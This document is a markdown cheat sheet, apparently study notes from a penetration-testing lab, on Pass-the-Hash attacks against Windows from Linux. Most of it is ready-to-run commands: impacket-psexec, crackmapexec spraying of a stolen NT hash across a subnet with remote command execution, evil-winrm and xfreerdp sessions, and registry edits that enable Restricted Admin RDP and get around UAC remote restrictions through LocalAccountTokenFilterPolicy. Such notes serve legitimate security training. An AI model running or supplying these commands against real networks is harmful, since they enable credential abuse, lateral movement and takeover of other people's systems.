# Pass the Hash (PtH) from Linux
**Concept:** The NTLM protocol authenticates users based on the _hash_ of their password, not the cleartext password itself. If you steal the hash (from SAM or LSASS), you become the user. 
**Requirement:** You need the **NT hash** (32 chars hex). The LM hash is usually blank or disabled.
## 1. Impacket (The Standard)
**Tools:** `psexec.py`, `wmiexec.py`, `smbexec.py`. 
**Format:** `LM:NT`. If you only have the NT hash, use `aad3b435b51404eeaad3b435b51404ee` (empty LM) or just `:NT_HASH` for the first part.
```shell
# Syntax: impacket-psexec <User>@<IP> -hashes <LM:NT>

# Example (Administrator with known NT Hash)
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
## 2. CrackMapExec / NetExec (The Sprayer)
**Use Case:** You dumped the local Administrator hash from _Machine A_. You want to see if this same password is used on _Machine B, C, and D_ (Password Reuse).
```shell
# Test hash against a subnet (Check only)
# -u: User | -d .: Local Domain | -H: Hash
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Execute command on success (-x)
crackmapexec smb 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 -x "whoami"
```
**Critical Flag:** `--local-auth` If you are authenticating as a **Local** user (not a Domain user), you often need to specify this flag to force local authentication.

```shell
crackmapexec smb 172.16.1.0/24 -u Administrator --local-auth -H <HASH>
```
## 3. Evil-WinRM (PowerShell Access)
**Use Case:** Getting a stable PowerShell session via WinRM (Port 5985).
```shell
# Syntax: -i <IP> -u <User> -H <Hash>
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
## 4. RDP (Restricted Admin Mode)
**Context:** Standard RDP requires a cleartext password. However, "Restricted Admin Mode" allows PtH. 
**Requirement:** The target must have the registry key `DisableRestrictedAdmin` set to `0`.

**Enabling it (If you already have Shell access):**
```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

**Connecting (xFreeRDP):**
```shell
# /pth: Pass the Hash
# /cert:ignore: Auto-accept certificate
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /cert:ignore
```
## 5. Limitations & UAC (Why PtH Fails)
**Scenario:** You have the hash for a local user who is in the Administrators group. You try `psexec.py`, but you get `Access Denied`. Why?

**The Mechanism:** **UAC Remote Restrictions.** When a local user (who is NOT the built-in RID 500 Administrator) logs in remotely, Windows strips their admin token. They become a standard user.

| **User Type**        | **Pass-the-Hash Status** | **Reason**                                               |
| -------------------- | ------------------------ | -------------------------------------------------------- |
| *Domain Admin*       | `Success`              | UAC does not apply to Domain accounts.                   |
| *RID 500 Admin*      | `Success`              | The built-in "Administrator" account is exempt from UAC. |
| *Local Admin (User)* | `Fail`                 | UAC strips the token remotely.                           |
**The Bypass (LocalAccountTokenFilterPolicy):** If this registry key is set to `1`, PtH works for _all_ local admins.
```powershell
# Command to enable PtH for all local admins
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```